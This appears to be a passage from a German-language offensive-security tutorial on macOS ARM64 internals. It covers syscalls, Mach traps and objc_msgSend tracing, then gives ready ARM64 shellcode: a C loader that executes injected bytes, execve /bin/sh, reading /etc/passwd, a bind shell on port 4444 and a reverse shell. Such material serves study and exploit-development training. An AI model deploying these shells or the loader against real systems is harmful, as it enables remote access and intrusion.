- **Mode and Exception Mask Bits** (0-4): Bestimmen den aktuellen Ausführungszustand. Das **5. Bit** zeigt an, ob das Programm als 32bit (1) oder 64bit (0) läuft. Die anderen 4 repräsentieren den **derzeit verwendeten Exception-Modus** (wenn eine Exception auftritt und behandelt wird). Die gesetzte Zahl **gibt die aktuelle Priorität** an, falls während der Behandlung eine weitere Exception ausgelöst wird.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Bestimmte Exceptions können durch die Bits **`A`**, `I`, `F` deaktiviert werden. Ist **`A`** 1, bedeutet das, dass **asynchrone Aborts** ausgelöst werden. Das **`I`** konfiguriert die Reaktion auf externe Hardware **Interrupt Requests** (IRQs), und `F` bezieht sich auf **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Siehe [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) oder führe `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` aus. BSD syscalls haben **x16 > 0**.

### Mach Traps

Siehe in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) die `mach_trap_table` und in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) die Prototypen. Die maximale Anzahl der Mach-Traps ist `MACH_TRAP_TABLE_COUNT` = 128. Mach-Traps haben **x16 < 0**, daher muss man die Nummern aus der vorherigen Liste mit einem Minus aufrufen: **`_kernelrpc_mach_vm_allocate_trap`** ist **`-10`**.

Du kannst auch **`libsystem_kernel.dylib`** in einem Disassembler prüfen, um herauszufinden, wie diese (und BSD-) syscalls aufgerufen werden:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Beachte, dass **Ida** und **Ghidra** auch **specific dylibs** aus dem Cache dekompilieren können, indem man einfach den Cache übergibt.

> [!TIP]
> Manchmal ist es einfacher, den **dekompilierten** Code von **`libsystem_kernel.dylib`** zu prüfen **als** den **Quellcode** zu prüfen, weil der Code mehrerer syscalls (BSD und Mach) mittels Skripten generiert wird (siehe Kommentare im Quellcode), während du in der dylib finden kannst, was tatsächlich aufgerufen wird.

### machdep calls

XNU unterstützt einen anderen Typ von Aufrufen, die "machine dependent" genannt werden. Die Nummern dieser Aufrufe hängen von der Architektur ab und weder die Aufrufe noch die Nummern sind garantiert konstant.

### comm page

Dies ist eine vom Kernel verwaltete Speicherseite, die in den Adressraum jedes Benutzerprozesses gemappt wird. Sie soll den Übergang vom Benutzermodus in den Kernelmodus schneller machen als die Nutzung von syscalls für Kernel‑Dienste, die so häufig verwendet werden, dass dieser Übergang sehr ineffizient wäre.

Zum Beispiel liest der Aufruf `gettimeofdate` den Wert von `timeval` direkt aus der comm page.

### objc_msgSend

Es ist sehr häufig, diese Funktion in Objective-C- oder Swift-Programmen zu finden. Diese Funktion ermöglicht das Aufrufen einer Methode eines Objective‑C‑Objekts.

Parameter ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Zeiger auf die Instanz
- x1: op -> Selector der Methode
- x2... -> Rest der Argumente der aufgerufenen Methode

Wenn du also einen Breakpoint vor dem Branch zu dieser Funktion setzt, kannst du im lldb leicht herausfinden, was aufgerufen wird (in diesem Beispiel ruft das Objekt ein Objekt von `NSConcreteTask` auf, das einen Befehl ausführt):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Wenn die Umgebungsvariable **`NSObjCMessageLoggingEnabled=1`** gesetzt ist, ist es möglich zu protokollieren, wann diese Funktion aufgerufen wird — in einer Datei wie `/tmp/msgSends-pid`.
>
> Wenn zusätzlich **`OBJC_HELP=1`** gesetzt ist und man ein beliebiges Binary aufruft, kann man weitere Umgebungsvariablen sehen, die man verwenden kann, um zu **protokollieren**, wann bestimmte Objc-C-Aktionen auftreten.

Wenn diese Funktion aufgerufen wird, muss die aufgerufene Methode der angegebenen Instanz gefunden werden; dafür werden verschiedene Suchen durchgeführt:

- Führe einen optimistischen Cache-Lookup durch:
- Bei Erfolg: erledigt
- runtimeLock (read) erwerben
- Wenn (realize && !cls->realized) → Klasse realisieren
- Wenn (initialize && !cls->initialized) → Klasse initialisieren
- Klassen-eigenen Cache prüfen:
- Bei Erfolg: erledigt
- Methodenliste der Klasse prüfen:
- Bei Fund: Cache füllen und erledigt
- Cache der Superklasse prüfen:
- Bei Erfolg: erledigt
- Methodenliste der Superklasse prüfen:
- Bei Fund: Cache füllen und erledigt
- Wenn (resolver): method resolver versuchen und ab class lookup wiederholen
- Wenn immer noch hier (= alles andere fehlgeschlagen): forwarder versuchen

### Shellcodes

Zum Kompilieren:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Um die Bytes zu extrahieren:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Für neuere macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-Code zum Testen von shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Entnommen von [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Mit cat lesen

Das Ziel ist es, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, daher ist das zweite Argument (x1) ein Array von params (was im Speicher einem Stack der addresses entspricht).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Befehl mit sh aus einem fork aufrufen, damit der Hauptprozess nicht beendet wird
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell von [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) auf **Port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Von [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell zu **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
